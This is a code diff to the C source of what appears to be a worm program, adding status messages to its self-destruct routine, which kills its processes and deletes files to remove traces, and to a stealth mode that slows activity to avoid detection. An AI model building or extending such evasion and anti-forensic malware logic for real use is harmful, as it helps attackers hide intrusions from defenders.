@@ -12,37 +12,39 @@ void cleanup_files(void) {
 
 // Cleanup processes
 void cleanup_processes(void) {
-    // Kill child processes (simplified)
-    // In a real implementation, we'd track PIDs
     system("pkill -f 'worm' 2>/dev/null");
 }
 
 // Self-destruct: Clean exit, remove traces
 void self_destruct(void) {
-    printf("[!] Risk level HIGH - Self-destructing...\n");
+    printf("\n=== SELF-DESTRUCTION MODE ACTIVATED ===\n");
+    printf("[!] CRITICAL RISK DETECTED - Initiating self-destruction sequence\n");
+    printf("[!] Cleaning up processes...\n");
     
-    // Stop operations
     cleanup_processes();
     
-    // Cleanup files
+    printf("[!] Cleaning up files...\n");
     cleanup_files();
     
-    // Exit cleanly
+    printf("[!] Artifacts cleaned\n");
+    printf("[!] Exiting...\n");
     exit(0);
 }
 
 // Perform stealth operations (minimal activity)
 void perform_stealth_operations(void) {
-    // Minimal operations in stealth mode
-    // Could include: passive monitoring, minimal scans, etc.
     printf("[*] Performing stealth operations...\n");
 }
 
 // Enter stealth mode: Reduce activity, longer delays
 void enter_stealth_mode(void) {
-    printf("[*] Entering stealth mode...\n");
+    printf("\n=== STEALTH MODE ACTIVATED ===\n");
+    printf("[!] HIGH RISK DETECTED - Reducing activity to avoid detection\n");
+    printf("[!] Increasing delays between operations\n");
+    printf("[!] Avoiding noisy operations\n");
     perform_stealth_operations();
-    // Long delay (5 minutes)
-    sleep(300);
+    printf("[*] Entering stealth delay (60 seconds)...\n");
+    sleep(60);
+    printf("[*] Stealth mode delay complete\n");
 }
 
